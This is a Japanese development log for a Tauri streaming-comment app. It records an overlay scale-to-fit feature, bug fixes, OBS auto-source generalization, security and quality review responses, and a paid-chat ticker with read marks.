  が変わらず**収まり判定が永久に動かない**（クリップ済みの絵が縮むだけ）。補正すると内容が `W/k × H/k` で
  レイアウトされ、本文が広い幅で再フローして行数が減る＝縮小が効率よく効く。
- **却下 `zoom`**: macOS の WKWebView（レガシー実装）と Chromium 128+ で「`clientHeight` が zoom 適用後か否か」が
  非対称＝測定ループの解釈がエンジン依存になる。クロスプラットフォームで最も避けたい性質。
- **却下 ルート font-size ＋ em 化**: `OverlayComment.module.css` の全 px 改変＝既存 overlay に波及する。

### 収束の保証（下限なしでも止まる）

transform 方式では **CSS のフォントサイズは 19px のまま不変**。k を下げるとレイアウト幅 `W/k` が広がって行数は
単調非増加、収容量 `available = H/k` は厳密単調増加 → `content/available` は k について厳密単調で、k→0 で 1 行に収まる。
実装ではさらに `next = min(k * sqrt(available/content), k - 0.02)` として**毎回必ず 1 段は下げる**ので、
measure が非単調・敵対的でも停止する。`MIN_FIT_SCALE = 0.1` は **UX 下限ではなく数値ガード**
（`100/k` の発散防止。480px 窓で k=0.1 は約 24,000 字相当＝Twitch 500 字 / YouTube 200 字の上限に対し 40 倍以上の余裕）。

### 実装上の判断

- **純粋ソルバを切り出した**（`features/comment-viewer/overlayFit.ts`・DOM を知らない）。jsdom はレイアウトを
  持たず `scrollHeight`/`clientHeight` が常に 0 なので、**合成 measure を注入して数値探索の性質だけを単体テスト**できる形にした。
- **クリップ用ラッパを新規 CSS 1 枚で追加**（`PinnedOverlayApp.module.css` の `.fit`）。縮小時 `.root` の
  レイアウトボックスは `W/k × H/k` のままで `#root` を溢れ、**透過窓に body スクロールバーが出うる**
  （既存のバー消しは `ol` 限定なので防げない）。046b の「新規 CSS ファイルゼロ」は、共有 CSS を触らずに
  済ませる唯一の手段としてここで**意図的に破った**。
- `transform`/`width`/`height` は `useLayoutEffect` の**排他所有**にし、JSX の `style` には載せない
  （載せると React の内部前回値と実 DOM がズレたとき diff が一致して**書き込みがスキップされる**事故が起きる）。
  **等倍のときは 3 プロパティを一切書かない**（`scale(1)` すら残さない）＝短文では 046b 時点と DOM が完全に同一。
- 測定対象は `rootRef.current.querySelector("ol")`（`CommentList` は共有で ref を受け取らないため。
  **既存 CSS が同じ理由で `ol` 要素セレクタを使っている**前例に揃えた）。`getBoundingClientRect()` は使わない
  （transform 適用後の視覚値を返し、変換前の値と混ぜると二重補正になる）。
- **`ResizeObserver` は使わない**: ①再測定が要る非同期要因が無い（オーバーレイのフォントは全て OS 標準＝FOUT 無し、
  `toPinned` が avatar を落とすので画像ロードも無い）②`.root` を observe すると自分でサイズを変えるたび再通知＝
  自己ループで、しかもこの窓は `background_throttling(Disabled)` なので**裏に回っても回り続けて配信中の CPU を焼く**。
  窓リサイズは `window.resize` を rAF コアレスで拾う（`TutorialOverlay` と同じ作法）。
- **fitScale は毎回 k=1 から測り直す**ので、StrictMode の二重実行でも前回の縮小が累積しない（冪等）。

### 依存している前提（壊すと機能が黙って死ぬ）

- **`li.item { flex-shrink: 0 }`**（043c）。外れると `li` が縦圧縮されて `scrollHeight === clientHeight` になり、
  カードが潰れたまま「収まっている」と誤判定して**恒久 no-op** になる。
- **レイヤー昇格させない**。`will-change: transform` / `translateZ(0)` を足すとラスタ倍率が固定されて確実にボケる。

### テスト（18 files / **239 tests**・222 から +17）

- **新規 `overlayFit.test.ts`（12 ケース）**: 収まっているとき等倍を返し **measure は 1 回だけ**（短文で縮めない）／
  安全余白の境界／290 字 × 320px 窓（見切れ再現）で**返り値のスケールで実際に収まっている**（後条件アサート）／
  290 字 × 560px 窓ならほぼ等倍（**窓の高さが主役**であることの裏取り）／500 字でも収まる／
  探索するスケールが**厳密減少**／常に「収まらない」と返す敵対 measure でも停止（**無限ループしない**）／
  非単調・振動する measure でも停止／`available=0` では縮めない／下限到達時も**返り値が DOM に適用済み**（契約）／
  返り値が常に (0,1] の 0.02 刻み。
- `PinnedOverlayApp.test.tsx` に **046c describe（5 ケース）**＋レイアウト偽装ヘルパ
  （`Element.prototype` の `scrollHeight`/`clientHeight` は configurable な getter なので上書き可。
  **`afterEach` で必ず復元**する＝漏れると同ファイルの全ケースに波及する）:
  収まるときは `transform` を付けない（**既存の見た目を変えない**の固定）／収まらないときは `transform` ＋
  サイズ補正の 3 点が付く／**スタブ無し（jsdom 素のまま）では縮めない**（`available<=0` 即 return の回帰テスト。
  これが無いと既存 11 ケースが全部スケール付きになる）／0 件ならラッパごと描かない／`resize` で測り直す。
- **ミューテーション実測 3 件**（①`applyFitScale` から `width`/`height` を落とす ②`available<=0` の即 return を落とす
  ③単調減少の強制 `k - FIT_STEP` を落とす）で、**対応する 1 ケースだけ**がレッドになることを確認。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**18 files / 239 tests**）、`cargo check` pass。

**既存 `comment-overlay` の非退行は diff の狭さで担保**: `OverlayApp.tsx` / `OverlayApp.module.css` /
`OverlayComment.module.css` / `CommentViewerApp.module.css` / `CommentList.tsx` / `pinnedComments.ts` /
`useFollowScroll.ts` はいずれも**差分ゼロ**（実測）。capability・`tauri.conf.json`・`vite.config.ts`・
`package.json`・`pnpm-lock.yaml`・`Cargo.toml`・`Cargo.lock`・sidecar も差分ゼロ。
**security-review は不要（軽レビュー）**＝新規コマンド・capability・外部通信・ファイル操作・依存はゼロで、
Rust の変更は窓サイズの数値定数 1 つのみ。localStorage の保存範囲・保存項目・キーも不変。

実機確認（`COMMENT_SIDECAR_MOCK=1 pnpm tauri dev`）は本人環境。目視項目は 046c タスクファイルの「検証」節。
とくに **k≈0.6 でのにじみ**（`.bubble`/`.card` の `filter: drop-shadow` がオフスクリーンを経由するため）と
**body スクロールバーが出ないこと**は、macOS / Windows の両方で確認が要る。
にじみが許容できなかった場合のフォールバック（本文だけ要素セレクタで font-size を上書き）も同タスクファイルに記載した。

## 2026-07-29 (046c 追修正 ＋ 046d 固定オーバーレイの OBS 自動ソース追加)

E2E で 2 件の問題が出たので対応した。**1 件は私が 046c で入れたバグ、1 件は先送り判断の誤り**。

### ① 046c の縮小フィットが常時発動していた（自分で入れたバグ）

`scrollHeight` は仕様上**`clientHeight` を下限にクランプ**され、内容が収まっているときは
`scrollHeight === clientHeight` になる。にもかかわらず収まり判定を

```ts
if (content <= available - FIT_SAFETY_PX) return scale;   // ← 絶対に真にならない
```

と書いていたため、**どんな短いコメントでも「収まっていない」と判定され、反復を使い切って約 0.86 倍まで縮小**されていた。

- 判定を `content - available <= FIT_TOLERANCE_PX(1)` の向きへ修正。定数名も `FIT_SAFETY_PX` →
  `FIT_TOLERANCE_PX` に変え、**「余白を取る向きに書いてはいけない」理由を JSDoc に明記**した。
- **テストが素通しした理由**: 合成モデルが `content` と `available` を**独立に**返しており、
  実 DOM ではありえない `content < available` を作れてしまっていた。モデルに
  `content = max(natural, available)` の制約を入れ、`content === available` を明示的に使う回帰ケースを追加した。
- ミューテーション実測: 旧判定式へ戻すと **4 ケース**がレッド（短文で縮めない／回帰／許容境界／290 字が 560px でほぼ等倍）。

### ② 固定オーバーレイの OBS 自動追加を「将来タスク」として先送りしていた（判断ミス）

親 046 と 046b の「やらないこと」に、固定専用オーバーレイの OBS 自動ソース追加が
**「044a の枠組み拡張・将来タスク」**として書かれていた。**できない理由はどこにも記録されていない。**
実際の障害は `obs-client.ts` がソース名／窓名を**モジュール定数 1 組**で持っていたという実装都合だけで、
パラメータ化すれば足りる規模だった。

**依頼者の意図は当初から「自動追加の対象内」**であり、先送りにした時点で確認を取るべきだった。
この行が「※対象外です（手動で追加してください）」という UI 文言を生み、E2E で
「固定しても OBS に自動で反映されない」として顕在化した。**先送りの判断そのものが誤り**なので、
親 046・046b の該当項を取り消し線付きで撤回し、[046d](tasks/046d-pinned-overlay-obs-auto-add.md) として実装した。

### 046d の実装（044a を 2 ソースへ一般化）

| 種別 | OBS ソース名 | キャプチャ対象の窓 |
|---|---|---|
| `comments` | `StreamDock コメントオーバーレイ` | `open_comment_overlay_window`（033f） |
| `pinned` | `StreamDock 固定コメント` | `open_pinned_overlay_window`（046b） |

- `obs-client.ts` に `ObsOverlayKind` と `OBS_OVERLAYS` 表を新設し、`enable`/`hide`/`ensureOverlaySource`/
  `findOverlayWindowItem`/`pickWgcMethodValue`/`setOverlaySceneItemEnabled` を種別でパラメータ化。
- 制御フレーム `obs-enable`/`obs-hide` に `overlay` を追加。**viewer からソース名・窓名は渡さない**＝
  載るのは `"comments" | "pinned"` の**固定 union だけ**で、実名は sidecar 内の表に閉じる（§3/§8）。
  `parseOverlayKind` は allow-list 方式で、未知値・未指定は `"comments"` へ劣化（044a 時点のフレームとの後方互換）。
- `handlePinnedOverlayToggle` が、**「OBSに自動で反映する」が ON のときだけ** ON で `enableObs(port,"pinned")`／
  OFF で `hideObs(port,"pinned")` を出す。045c の「表示が主・自動反映は従」「明示的に有効化した時のみ接続」を維持。
- **猶予タイマーは種別ごとに別 ref**（共有すると片方の ON がもう片方の仕掛かりを取り消す）。アンマウント掃除も両方。
- 自動反映トグル ON 時・OBS パスワード保存後の再試行も、開いている方を両方対象にする。
- `SettingsView` の「※上の『OBSに自動で反映する』の対象外です」を撤回し、自動追加される旨＋自動反映 OFF 時の手動手順へ差し替え。

**セキュリティ（軽レビュー）**: 宛先・プロトコル・依存はすべて不変（`ws://127.0.0.1:4455`・obs-websocket-js・
新規 npm/crate ゼロ）。増えるのは「OBS のシーンに作られるソースが最大 2 つになる」点のみで、
`docs/security.md` の 044a 例外に 046d 節として明記した。capability・`csp: null`・Rust 完全同期はいずれも不変。

### テスト（18 files / **243 tests**・239 から +4）

- `overlayFit.test.ts`: 回帰ケース「短文（content === available）を縮めない」＋許容境界を追加。合成モデルに
  `content >= available` の制約を入れた（**この制約が無いとバグを素通しする**旨をコメントで固定）。
- `commentStream.obs.test.ts`: `overlay` 種別がフレームに載ることと、**送信フレームに `StreamDock` という
  文字列が一切現れない**こと（＝ソース名を viewer から渡していない）を固定。
- `CommentViewerApp.toolbar.test.tsx`: 旧「044a とは独立＝制御フレームを出さない」ケースを、新仕様 3 ケース
  （自動反映 ON で ON→猶予後 `enableObs(pinned)`／OFF→`hideObs(pinned)`／**自動反映 OFF なら一切繋がない**）へ差し替え。
- `SettingsView.obs.test.tsx`: 「対象外」を明示するケースを、自動追加を案内するケースへ反転。

### 検証結果

`typecheck`（desktop / sidecar）・`lint`・`test`（**18 files / 243 tests**）・`cargo check` pass。
`node scripts/test-obs-client.mjs`（OBS-CLIENT PASS）・`node scripts/test-host-guard.mjs`（HOST-GUARD PASS）＝
**loopback 限定の fail-closed は不変**。

実機確認は本人環境（`COMMENT_SIDECAR_MOCK=1 pnpm tauri dev` ＋ OBS の WebSocket 有効）。目視項目は 046d タスクファイルの「検証」節。

### 教訓

- **「将来タスク」として先送りする判断は、依頼者に確認してから記録する**。理由を書かずに「やらないこと」へ入れると、
  後続タスクがそれを確定した線引きとして踏襲し（046b の UI 文言）、E2E まで誤りが露見しない。
- **測定 API の値域制約をテストモデルに入れる**。`scrollHeight >= clientHeight` のような「実装では絶対に成り立つ制約」を
  合成モデルが破ると、判定式の誤りをテストが素通しする。

## 2026-07-29 (046c/046d 外部レビュー〔security + 品質〕の対応)

046b/046c/046d の未コミット差分に対する外部レビュー（security-review ＋ 品質・effort high）への対応。
**総合判定は「軽微な懸念あり・コードの修正必須 0 件」**だが、`docs/security.md`（正）に実装と矛盾する記述が
残っていた点を修正必須として扱い、併せて品質指摘 3 件を修正した。

### 修正（要修正）

- **S-1 `docs/security.md` の自己矛盾（正となる文書の誤り）**: 「Tauri Permissions / Capabilities 方針」046b 節に
  「この窓は 044a の自動追加の**対象外**＝手動ウィンドウキャプチャ前提。sidecar 側 044a のコードは不変」が残り、
  同ファイル §1 の 046d 節（自動追加の対象に入れた・sidecar を改変した）と**正面から矛盾**していた。
  046 / 046b のタスクファイルは取り消し線＋失効注記で処理済みだったのに security.md だけ漏れていた。
  失効を明記し、**窓名の非部分一致要件は「分かりやすさ」ではなく「自動追加が窓を取り違えないための機能要件」**として
  格上げした。同じ誤りが `lib.rs` の `open_pinned_overlay_window` doc comment と
  `SettingsView.obs.test.tsx` のファイル冒頭仕様にもあったので併せて訂正。
- **S-5 `core:default` の言い換えが実際より狭かった**: `gen/schemas/acl-manifests.json` を展開すると
  `core:window:default` に **`allow-internal-toggle-maximize`** が含まれる。「`allow-create-*`/`allow-close`/`allow-set-*`
  は含まれない」という主要な主張は正しいが、「リサイズはできない」という言い換えは厳密には成立しないため
  例外として明記した（ドラッグ領域のダブルクリック用・ローカルバンドルのみを読む窓なので実害なし）。
- **Q1 `PinnedOverlayApp.test.tsx` に 046c 初回実装と同じモデリング欠陥が残っていた**（今回いちばん重要）。
  `overlayFit.test.ts` のモデルには `content = max(natural, available)` の制約を入れたのに、こちらの
  `stubLayout(200, 560)` は `scrollHeight < clientHeight` ＝**実 DOM では起こり得ない値**のままだった。
  旧判定式 `content <= available - 8` を注入すると `200 <= 552` が真になり、**バグ入りでも
  「収まっているときは縮めない」ケースがグリーンになる**（＝回帰テストとして機能していなかった）。
  `stubLayout` 自身に `Math.max(content, available)` の丸めを入れて構造的に防いだ。
  **ミューテーション実測: 旧判定式を注入すると 0 件 → 2 件レッドに変わることを確認。**
- **Q2 `fitScale` が反復打ち切り経路で自分の契約を破っていた**。ループ末尾で `scale = next` を先に代入するため、
  `MAX_FIT_ITERATIONS` を使い切った経路の返り値が **DOM に適用済みの値より 1 段（`FIT_STEP`）小さい**。
  JSDoc の「return した時点で DOM には返り値のスケールが適用済み」は当該経路で偽だった
  （`FIT_TOLERANCE_PX` を一定量だけ超え続ける measure＝分割不能な要素があるケースで到達する）。
  `measure` を必ず通す `apply` ラッパを導入し「返り値は常に `applied`」を**構造的に**保証。契約テストも追加した
  （既存の契約テストは下限クランプ経路だけで、打ち切り経路は未カバーだった）。
- **Q3 固定側の自動追加が「設定値」でゲートされていた非対称**。コメント一覧側は `overlayOpen`（実窓）なのに
  固定側は `pinnedOverlayEnabled`（**永続設定値**）で判定していた。設定 ON ／ 窓なし（open の invoke 失敗等）で走ると
  sidecar 側 `ensureOverlaySource` が**先に `CreateInput` してから**窓探索に失敗するため、
  キャプチャ対象未設定の空ソース「StreamDock 固定コメント」が OBS に残る（手で消すまで消えない）。
  `requestPinnedObsAutoAddIfOpen()` を新設して `isPinnedOverlayOpen()` で実窓を見るようにした。
- **Q4 S-1 の担保が汎用の永続化 effect への相乗りだった**のを、独立した専用 effect（`savePinned([])` をマウント時 1 回）
  として明示化。指摘は ①意図が表明されていない ②同型の save effect が 10 個並ぶため「初回スキップ/前回値比較」の
  一括最適化で静かに壊れる ③所有者の単位でテストできない、の 3 点。
  **`pinnedComments.ts` は引き続き無改変**（`clearPinned()` を新設せず `savePinned([])` を使う）。
  専用 effect は**窓を開く effect より前に宣言**し、これで宣言順とマイクロタスク境界の二重で
  「クリアが窓生成より先」が保証される。永続化 effect からは禁止コメントを外した（もう S-1 の担保ではない）。
- **Q5 窓タイトル契約を `#[cfg(test)]` でテスト化**（046d で重大度が上がったため「別タスク送り」から格上げ）。
  046d 以後、`.title` は sidecar `OBS_OVERLAYS[kind].windowTitle` とバイト一致していないと自動追加が窓を探せない。
  しかも `ensureOverlaySource` の M2 フォールバックにより **既存ソースがある状態での不一致は `"reused"`＝成功として返る**
  （UI は成功表示・OBS のソースは真っ黒）ため、grep 頼みでは配信中に切り分けられない。
  `lib.rs` に `pinned_overlay_contract` を新設し、`include_str!` で TS ソースを文字列照合する（新規依存ゼロ・
  `#[cfg(test)]` のみで通常ビルドには入らない）。①非部分一致 ②`.title` の実使用 ③sidecar 表とのバイト一致
  ④`SHARED_BROWSER_ARGS` の全 4 窓一致（`main` は `tauri.conf.json`）の 4 本。
  **ミューテーション実測: sidecar 側の窓名を 1 文字変えると③がレッド。**
  ⚠ `include_str!("lib.rs")` は**このテスト自身のソースも含む**ため、検索文字列を直書きすると自分がヒットして
  数が 1 つ増える（実装中に実際に踏んだ）。needle は `format!` で実行時に組むこと。
- **046d タスクファイルに「許容根拠の依存関係」を追記**（レビュー S-7）。通信面が軽レビューで足りるのは事実だが、
  044a を例外にした理由は通信だけではなく「OBS シーンへ自動でソースを作る権限」であり、046d はその**対象窓の集合を
  広げる**変更。増えた窓が描くのは §9 追補（046a）が対象とする第三者の個人データそのもの。
  **したがって 046d の許容根拠には S-1 が含まれる**（S-1 が無ければ「永続 ON → 自動 open → 自動ソース作成 →
  前回配信の固定が操作ゼロで本番へ」が完成する）。**再レビュー必須トリガー＝S-1 を撤回・緩和するとき**。

### 修正不要（コメント化）

- **`obsState` を 2 種別で共有している**点（`requestObsAutoAdd` の注記）。失敗表示がどちらのソースか区別できず、
  同時実行では最後の書き手が勝つ。それでも分けないのは、これがセットアップ時の一度きりの操作で、失敗しても
  OBS 側は壊れず設定カードに手動手順が併記されているため。sidecar 側は 2 種別で**別ソース名**を触るので
  同時実行でも二重ソース作成・相互破壊は起きない（`obs-client.ts` の L5 注記が種別違いでも成立）。
  再修正トリガー＝「どちらが出ていないか分からない」問い合わせが実際に出たら `Record<ObsOverlayKind, ObsState>` へ。
- レビューで**変更不要と確認された**もの: `MIN_FIT_SCALE = 0.1` の整理（k=0.1 で約 47,000 字相当の容量＝
  タスクファイルの「約 24,000 字」は控えめな安全側の見積り。Twitch 500 / YouTube 200 字に対し十分）／
  `querySelector("ol")` と 3 プロパティの `useLayoutEffect` 排他所有（どちらも理由付けが正しい）／
  `.fit` の `overflow:hidden`（`theme.css` の `html,body,#root{height:100%}` で百分率が解決し、
  オーバーフローは祖先へ伝播しない＝body スクロールバーを確実に断てる）／`transform` の包含ブロック副作用
  （この窓は `onContextMenu` を渡さないので `position:fixed` の子孫が存在しない）／
  ジオメトリ（既存 overlay 24〜424 と新窓 456〜936 で 32px の間隔）／`SettingsView` の見出し重複（045b の既知問題を
  悪化させていない）／`PinnedOverlayApp` と `OverlayApp` の重複（既存 overlay を触らない方針を優先）。

### 意図的に対応しない（依頼者の決定・2026-07-29）

- **`parseOverlayKind` の単体テストは追加しない**（選択肢 (b) 現状維持を採用）。
  指摘の内容＝この関数は「信頼できない JSON（loopback WS の制御フレーム）が最初に入ってくる境界」に置かれた
  **046d の実質的なセキュリティ制御**で、TypeScript の型は何も守らない（引数は `JSON.parse` 由来の `unknown`）のに、
  `test-obs-client.mjs` は `isWgcMethodName` だけで**この関数を一切検証していない**
  （`(v) => v as ObsOverlayKind` に書き換えても全テストがグリーン）。
  **追加しない理由**＝テストするには `index.ts`（top-level で `main()` を呼ぶ＝**import すると sidecar が起動する**）
  から関数を移す必要があり、移動先として自然な `obs/obs-helpers.ts` と `scripts/` は 046d で
  **差分ゼロが要件**（fail-closed 層に手を入れていないことの担保）だった。要件を破ってまでの利得は無いと判断した。
  **安全側の根拠**＝①`parseControlFrame` 内で**明示構築**したオブジェクトにしか値を載せない（`msg` をスプレッド
  しないので未検証フィールドが混入しない）②`obs-enable` / `obs-hide` の**両方**に適用済み
  ③未知値の劣化先 `"comments"` は 044a 時点と同一の挙動＝権限が広がらない。
  判断と再修正トリガーは `index.ts` の `parseOverlayKind` の JSDoc に記載（3 つ目の種別を足すとき／
  制御フレームに別の列挙型を足すとき／`obs-helpers.ts` を別の理由で改変するとき）。

### テスト（18 files / **247 tests**・243 から +4）

- `overlayFit.test.ts` +1（反復打ち切り経路の契約＝返り値が適用済み）
- `CommentViewerApp.toolbar.test.tsx` +3（S-1 の**順序**＝窓を開く瞬間にストアが既に空／自動反映 ON 時に
  両オーバーレイを対象／固定側は実窓でゲート）
- Rust `pinned_overlay_contract` +4（`cargo test`・上記 Q5）

### 検証

`typecheck`（desktop / sidecar）・`lint`・`test`（**18 files / 247 tests**）・`cargo check`・
`cargo test`（95 tests）・`test-obs-client.mjs` PASS・`test-host-guard.mjs` PASS。

### 学び

- **レビュー指摘の反映漏れは「正となる文書」で起きやすい**。046d はタスクファイル 3 本を取り消し線で正しく
  訂正したのに、`docs/security.md` の別セクション（Capabilities 方針）に同じ主張が残っていた。
  **線引きを撤回したら、その主張が書かれている箇所を全文検索して洗い出すこと**（今回は `対象外` で grep して発見）。
- **モデリング欠陥の修正は、同じ欠陥を持つ全テストに適用する**。046c で `overlayFit.test.ts` のモデルは直したが、
  同じ制約が要る `PinnedOverlayApp.test.tsx` の `stubLayout` は見落としていた。
  制約は**呼び出し側の引数ではなくヘルパ内部に埋める**と再発しない。
- **「返り値は DOM に適用済み」のような契約は、代入と適用の順序で静かに破れる**。
  適用を必ず通すラッパ（`apply`）を作り、返り値をその記録から取ると構造的に守れる。
- **`include_str!` で自ファイルを読むテストは、自分自身のソースもヒットする**。検索文字列は実行時に組む。

## 2026-07-29 (047 課金チャットの常時ティッカー＋クリック展開＋既読マーク)

流れて消えるコメント一覧の中で投げ銭を見失わないよう、**課金チャット 7 種別（スパチャ/ビッツ/サブスク/メンシプ/
ギフト/ドネーション/ジュエル）をコメビュ本体の上部に横スクロールの帯で常時表示**し、**ピルのクリックで全文を
重ねダイアログに展開**できるようにした（親 [047](tasks/047-superchat-ticker.md) ＝要望④）。
依頼者の追加要望として、**展開済み＝既読を ✓ で一目判別できる**ようにしている。

**frontend の表示追加のみ**。Rust / sidecar / capabilities / `tauri.conf.json`（`csp: null`）/ `package.json` は
いずれも**差分ゼロ**で、新規の外部通信宛先・API・WS・capability・依存はゼロ。**localStorage への書き込みもゼロ**
（下記のとおり永続しない）。課金コメント（本文・名前・金額）は **Rust の DB / ログに出さず外部送信もしない**（§9）。
043b（一覧の赤枠強調）・043c（OBS 投げ銭カード）・046a（固定帯）は**一切変更していない**（別レイヤで共存）。

### 抽出方針: `comments` から導出せず**課金だけ別に蓄積**した（本タスク最大の設計判断）

タスクファイルの案は `comments.filter(isMonetaryEvent)` だったが、**採らなかった**。
`comments` は `MAX_COMMENTS = 200` でクランプされるため、**200 件のコメントが流れた時点でティッカーから投げ銭が
消える**。本機能の目的は「流れて消える一覧の中で見失わないための常時表示」なので、それは目的を直接壊す
（046a も実機で同じ轍を踏み、固定したコメントが一覧から流れ去ると「右クリックする対象そのものが消えて解除できない」
という不具合になった）。

そこで新規の純関数 [`screens/comment-viewer/monetaryFeed.ts`](../apps/desktop/src/screens/comment-viewer/monetaryFeed.ts) を置き、
`comments` とは**独立に同じ `incoming` から**課金だけを蓄積する。

| 論点 | 決定 |
|---|---|
| 上限 | `MONETARY_MAX = 50`。超過は**最古（末尾）から**破棄。全期間の履歴/集計は 038 の領分で持たない |
| 並び | **最新が先頭（＝ティッカーの左端）** |
| combo 更新 | **043e の jewels combo 更新に追随**する。同一 id は件数を増やさず中身だけ差し替え |
| 永続化 | **しない**（下記） |
| 参照安定性 | 変化ゼロなら `prev` を**同一参照で**返す。chat しか来ないバッチが支配的なのでこの early-out が効く |

**`mergeComments.ts` への変更は `hasComboPayloadChanged` を `export` した 1 行だけ**（本体ロジック・`MAX_COMMENTS`・
戻り値 3 バケットの意味論は不変＝TTS/記録の単一注入点には触っていない）。比較キーを 2 箇所へ複製すると
「比較キー ⊇ Rust が UPDATE する列」という既存の不変条件が片方だけ静かに腐り、**ティッカーの金額が combo 更新後も
古いまま固まる**という気付きにくい壊れ方をするため、単一の真実として共有した。

`mergeComments` の**中**に入れなかった理由: ①`mergeComments` は表示・TTS・保存の 3 系統がぶら下がる単一注入点で、
表示専用の関心を混ぜたくない ②setState の updater 内で別の setState を呼ぶ入れ子を作らない
③そもそもティッカーは 200 件クランプの影響を受けてはいけないので `next` からは導出できない。

#### 永続化しない（＝§9 追補〔046a〕の対象外・軽レビューのまま）

`localStorage` には**保存しない**（蓄積・既読ともセッション内のみ）。理由は 2 つ:

- 046b の S-1 で「**前回配信で来たコメント（表示名・本文・金額）が、次の配信の開始時にユーザー操作ゼロで
  本番画面へ出る**」経路を断つと決めた（`savePinned([])` のマウント時クリア）。同じ性質のデータをここで
  永続させると、その判断を裏口から覆すことになる。
- 046 の教訓「**保存するデータの種類が変わる変更は軽レビューに置かない**」。永続させると本タスクは
  `security-review` 相当になる。表示だけで目的（見逃し防止）は達成できるので、永続は採らなかった。

### 上部の並び順と縦幅

**確定順**: `toolbar` → クレジット（読み上げ ON 時） → ENGINE バナー（条件付き） → **ティッカー** → 固定帯（046a） → `commentSplit`

ティッカーを**固定帯の上**に置いた理由:
1. ティッカーは「課金が 1 件でもあれば出っぱなし」なのに対し固定帯は 0/1 件で頻繁に出入りする。上に置けば
   **固定の出入りでティッカーの縦位置が動かない**。
2. 固定帯は自身の `border-bottom` でコメント一覧との境目を担っている（046a の実機修正）。その隣接関係を壊さない
   ＝**`PinnedCommentBar` / `.pinnedBar` を 1 行も触らずに済む**。
3. YouTube のライブチャットも「ヘッダ直下がティッカー、その下が固定メッセージ」の順。

縦幅（コメビュ窓は既定 960×720 / 最小 560×520＝`lib.rs` の `min_inner_size`）:

| 段 | 高さ | 出る条件 |
|---|---|---|
| `.toolbar` | ≈46px | 常時 |
| `.credit` | ≈73px | 読み上げ ON |
| `.engineBanner` | ≈45px | 読み上げ ON かつ ENGINE 未起動 |
| **`.tickerBar`（新規）** | **≈36px** | **課金 1 件以上** |
| `.pinnedBar` | ≈73px（`max-height: 22vh` で自衛済み） | 固定 1 件 |

**5 段すべてが同時に出て 273px**。既定 720px なら一覧に 447px（62%）、最小 520px でも 247px（48%）残る。
**ティッカーの寄与は −36px のみ**で、`flex-wrap: nowrap` ＋ `overflow-x: auto` の 1 行固定なので件数が増えても
縦には伸びない。**課金 0 件では `return null`＝0px**（この機能を使わないユーザーには既存レイアウトが完全に不変・
`PinnedCommentBar` と同じ作法）。

### ダイアログはネイティブ `<dialog>` ＋ `showModal()`（`ConfirmDialog` と同じ idiom）

タスクファイルは「視聴者詳細の全幅オーバーレイ（`.detailPane`）を土台に」としていたが、**採らなかった**。

- `<dialog>` + `showModal()` なら focus trap・Esc・backdrop・モーダル化が**新規依存ゼロ**で付く（038b で実証済み）。
- `<dialog>` は **top-layer** に出るので **z-index 競合が構造的に起きない**（狭窓の `.detailPane`=5 /
  `.contextMenu`=20 という既存の重なり順に行を増やさずに済む）。
- `.detailPane` は「広窓は横並び・狭窓のみ absolute」という別要求の意匠で、「背景を止めて全文を読む」という
  本ダイアログの目的とは合わない。

`ConfirmDialog` を props 拡張して流用はしない（confirm/cancel の意味論が違う）が、**CSS は流用**する
（`.confirmDialog` / `.confirmBody` / `.confirmTitle` / `.confirmActions` / `.btnGhost`）。
閉じる 3 経路（Esc / backdrop クリック / 「閉じる」ボタン）はテストで固定した。
`useEffect` の依存を `[open]` にする理由は `ConfirmDialog.tsx` の該当コメントと同じ（`[]` だと二度と開かない）。

### 横スクロールの挙動: **最新は左・自動スクロールしない**

`useFollowScroll` は `scrollTop/scrollHeight` 固定の縦専用で、軸パラメータ化は 3 呼び出し元を持つ既テスト済み
フックのリファクタになる（仕様外）。**最新を左に積む設計にすると追従ロジック自体が不要**になり、
「配信者が過去のスパチャを見ている最中に位置を飛ばされる」問題が構造的に起きない。それでも最新は常に左端の
定位置に出るので見逃さない。マーキー（CSS アニメーション）にもしていない＝**動く的をクリックさせない**。
ピルは実 `<button>` なので Tab 移動・Enter/Space・フォーカス時の自動横スクロールがブラウザ標準で付く。
**未読件数チップは `position: sticky; left: 0`** で、横にスクロールしても未読の存在に気付ける。

### 既読（✓）の仕様（依頼者の追加要望）

- ピルを押して**ダイアログを開いた時点で既読**。手動の既読/未読トグルは付けない（導線を増やさない）。
- 未読 = 赤枠＋（043b の `.itemMonetary` と同じ `--danger` 表現）／既読 = 先頭に ✓（`--ok`）＋文字を `--muted` へ減光。
  消しはしない（金額の見返しに使うため）。既読/未読は `aria-label` にも出す。
- **既読 id は `CommentViewerApp` が持つ**。ティッカー側に置くと、設定ビュー／視聴者ビューへ切り替えて戻った
  時点で `view === "comment"` の分岐ごとアンマウントされ**既読が消える**（`pinned` / `viewerBadges` と同じ置き場所）。
- 開いているダイアログの実体は id ではなく `items` から引き直しているので、**combo 更新で金額が伸びたら
  開いたままのダイアログにも反映される**（テストで固定）。

### 意図的にタスクファイルから逸脱した点

- **ティア配色（`superchatTier`）を使わない**。本機能の最重要の色信号は未読/既読（未読＝赤枠）で、そこに 7 段の
  ティア勾配を重ねると信号が競合し「未読が一目で分からない」という本末転倒になる。またティア配色の実クラスは
  `OverlayComment.module.css` の **OBS 映像向けトークン系統**で、本体 UI の役割トークン運用（015/016）へ引き込むと
  意匠が二重管理になる。金額は `monetaryAmount` を verbatim 表示するので額の情報は落ちない。
  **再修正トリガー**＝実機で「金額の大小が一目で分からない」となったら、未読/既読を枠以外のチャネル（✓ と太さ）へ
  移したうえでピル背景にティアを入れる。
  **副作用（レビューで明示・据え置き）**: 未読を `--danger`（赤枠）にしたことで、**同じ赤が UI 内で 2 つの意味を
  持つ**ようになった＝一覧（043b `.itemMonetary`）の赤枠は「課金」、ティッカーの赤枠は「未読」。帯の中は全件が
  課金なので帯内での曖昧さはゼロだが、一覧とティッカーを同時に見る配信者には語彙のズレがある。ティア配色を
  入れないという上の判断とセットで許容する。
- **コンポーネント名は `MonetaryTicker`**（タスクの例は `SuperchatTicker`）。対象は superchat 以外 6 種を含み、
  既存語彙（`isMonetaryEvent` / `MONETARY_EVENT_TYPES` / `.itemMonetary`）に揃うため。
- **ダイアログにピン留め導線は足さない**（範囲外）。046a のピンは `PINNED_LIMIT = 1` の「1 件だけ大きく再掲」で
  役割が違い、両方に同じ導線を置くと「固定は 1 件だけ」の制約が分かりにくくなる。価値はあるので別タスク相当。

### 配置（`monetaryFeed.ts` が features/ ではなく screens/comment-viewer/ にある理由）

抽出条件 `isMonetaryEvent` が `viewerFormat.ts`（screens/comment-viewer）にあり、**features/ から screens/ を import
